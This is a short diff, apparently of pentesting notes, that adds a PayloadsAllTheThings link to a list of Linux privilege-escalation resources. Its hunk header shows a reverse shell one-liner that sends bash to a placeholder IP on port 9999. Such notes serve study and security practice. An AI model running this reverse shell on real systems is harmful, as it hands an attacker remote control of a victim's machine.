@@ -271,3 +271,4 @@ bash -i >& /dev/tcp/IP/9999 0>&1
  - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
  - https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist 
  - **https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ **- Basic Linux Privilege Escalation
+ - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation
